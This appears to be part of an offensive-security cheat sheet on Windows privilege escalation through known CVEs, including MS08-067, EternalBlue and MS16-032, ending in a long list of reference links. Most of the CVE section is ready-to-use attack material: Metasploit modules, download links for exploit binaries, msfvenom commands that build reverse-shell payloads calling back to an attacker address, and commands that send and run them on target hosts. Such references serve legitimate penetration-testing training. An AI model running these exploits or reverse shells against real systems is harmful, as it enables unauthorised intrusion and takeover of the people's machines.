<!-- provenance: InternalAllTheThings docs/redteam/escalation/windows-privilege-escalation.md @ 203bb0c | part 5/5: Windows Privilege Escalation - CVEs | converted for Agent Skills; see ../../NOTICE.md -->

# Windows Privilege Escalation - CVEs

## EoP - Common Vulnerabilities and Exposure

### MS08-067 (NetAPI)

Check the vulnerability with the following nmap script.

```c
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
```

Metasploit modules to exploit `MS08-067 NetAPI`.

```powershell
exploit/windows/smb/ms08_067_netapi
```

If you can't use Metasploit and only want a reverse shell.

```powershell
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
python ms08-067.py 10.0.0.1 6 445
```

### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7

'KiTrap0D' User Mode to Ring Escalation (MS10-015)

```powershell
https://www.exploit-db.com/exploits/11199

Metasploit : exploit/windows/local/ms10_015_kitrap0d
```

### MS11-080 (afd.sys) - Microsoft Windows XP/2003

```powershell
Python: https://www.exploit-db.com/exploits/18176
Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
```

### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012

```powershell
printf("[#] usage: ms15-051 command \n");
printf("[#] eg: ms15-051 \"whoami /all\" \n");

# x32
https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe

# x64
https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
use exploit/windows/local/ms15_051_client_copy_image
```

### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)

Check if the patch is installed : `wmic qfe list | findstr "3139914"`

```powershell
Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

### MS17-010 (Eternal Blue)

Check the vulnerability with the following nmap script or netexec: `netexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010`.

```c
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
```

Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.

```powershell
auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection
exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

If you can't use Metasploit and only want a reverse shell.

```powershell
git clone https://github.com/helviojunior/MS17-010

# generate a simple reverse shell to use
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```

### CVE-2019-1388

Exploit : [packetstormsecurity/hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)

Requirement:

* Windows 7
* Windows 10 LTSC 10240

Failing on :

* LTSC 2019
* 1709
* 1803

Detailed information about the vulnerability : [Thanksgiving Treat: Easy-as-Pie Windows 7 Secure Desktop Escalation of Privilege - Simon Zuckerbraun - November 19, 2019](https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege)

## References

* [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - Simon Zuckerbraun - March 17, 2022](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
* [Abusing Diaghub - xct - March 7, 2019](https://vulndev.io/2019/03/06/abusing-diaghub/)
* [Abusing SeLoadDriverPrivilege for privilege escalation - June 14, 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [Abusing the SeRelabelPrivilege - @decoder_it - May 30, 2024](https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/)
* [Alternative methods of becoming SYSTEM - Adam Chester @_xpn_ - November 20, 2017](https://blog.xpnsec.com/becoming-system/)
* [Basic Linux Privilege Escalation - g0tmi1k - August 2, 2011](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Bypassing AppLocker by abusing HashInfo - Ian - August 19, 2022](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)
* [Chapter 4 - Windows Post-Exploitation - dostoevskylabs - November 2, 2017](https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md)
* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://web.archive.org/web/20191105182846/https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
* [Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter - ANDREW OLIVEAU - SEP 11, 2023](https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities)
* [Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023](https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)
* [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
* [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
* [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
* [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
* [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
* [MSI Shenanigans. Part 1 – Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach](https://mgeeky.tech/msi-shenanigans-part-1/)
* [MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe](https://badoption.eu/blog/2023/10/03/MSIFortune.html)
* [Pentestlab.blog - WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)
* [Pentestlab.blog - WPE-02 - Windows Kernel](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)
* [Pentestlab.blog - WPE-03 - DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)
* [Pentestlab.blog - WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)
* [Pentestlab.blog - WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)
* [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
* [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
* [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
* [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
* [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
* [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
* [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
* [Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
* [Privilege Escalation Windows - Philip Linghammar](https://web.archive.org/web/20191231011305/https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
* [Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell](https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/)
* [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
* [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
* [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
* [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
* [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
* [Webinar - Windows Client Privilege Escalation - Oddvar Moe - March 26, 2025](https://www.youtube.com/watch?v=EG2Mbw2DVnU)
* [Windows Client Privilege Escalation-Shared.pptx - Oddvar Moe - March 27, 2025](https://fr.slideshare.net/slideshow/windows-client-privilege-escalation-shared-pptx/277239036)
* [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)
* [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
* [Windows Privilege Escalation Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
